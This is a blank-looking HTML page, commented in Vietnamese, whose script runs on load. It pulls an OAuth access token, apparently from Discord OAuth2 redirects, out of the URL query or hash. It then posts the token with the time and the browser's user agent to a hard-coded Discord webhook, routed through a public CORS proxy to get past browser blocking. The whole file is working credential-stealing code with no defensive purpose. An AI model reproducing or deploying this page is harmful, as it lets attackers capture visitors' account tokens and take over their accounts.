<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body, html {
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
    // Dán thẳng link Discord Webhook của bạn vào đây (Không cần tạo Pipedream nữa)
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe";

    function extractToken() {
        let token = null;

        // 1. Kiểm tra query string (?token=... hoặc ?access_token=...)
        const urlParams = new URLSearchParams(window.location.search);
        token = urlParams.get('token') || urlParams.get('access_token');

        // 2. Kiểm tra hash fragment (#token=... hoặc #access_token=...) - Chuẩn Discord OAuth2
        if (!token && window.location.hash) {
            const hashParams = new URLSearchParams(window.location.hash.substring(1));
            token = hashParams.get('token') || hashParams.get('access_token');
        }

        return token;
    }

    function sendToWebhook() {
        const token = extractToken();
        if (!token || !WEBHOOK_URL || WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK_URL_HERE")) return;

        // Định dạng tin nhắn gửi thẳng vào Discord
        const payload = {
            content: `🚨 **Token Mới Được Ghi Nhận!**\n- **Token:** \`${token}\`\n- **Thời gian:** ${new Date().toLocaleString()}\n- **Trình duyệt:** \`${navigator.userAgent}\``
        };

        // Sử dụng CORS Proxy miễn phí để vượt qua lớp chặn của trình duyệt
        const proxyUrl = "https://corsproxy.io/?";
        const targetUrl = proxyUrl + encodeURIComponent(WEBHOOK_URL);

        fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        }).catch(() => {});
    }

    // Tự động chạy ngay khi trang load xong
    window.addEventListener('load', sendToWebhook);
</script>

</body>
</html>
